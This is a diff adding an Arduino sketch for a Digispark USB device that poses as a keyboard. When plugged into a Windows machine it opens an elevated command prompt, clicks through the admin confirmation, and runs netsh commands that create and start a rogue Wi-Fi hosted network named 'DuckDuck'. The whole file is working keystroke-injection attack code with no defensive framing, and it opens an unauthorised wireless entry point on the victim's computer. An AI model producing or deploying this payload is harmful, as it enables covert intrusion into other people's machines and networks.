@@ -1,0 +1,30 @@
+//wifi access point
+#include "DigiKeyboard.h"
+void setup(){
+  
+}
+
+void loop(){
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("powershell -Command \"Start-Process cmd -Verb RunAs\"");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.print("netsh wlan set hostednetwork ssid=DuckDuck  key=FuckFuck");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.print("netsh wlan start hostednetwork");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){
+    //empty
+  }
+}
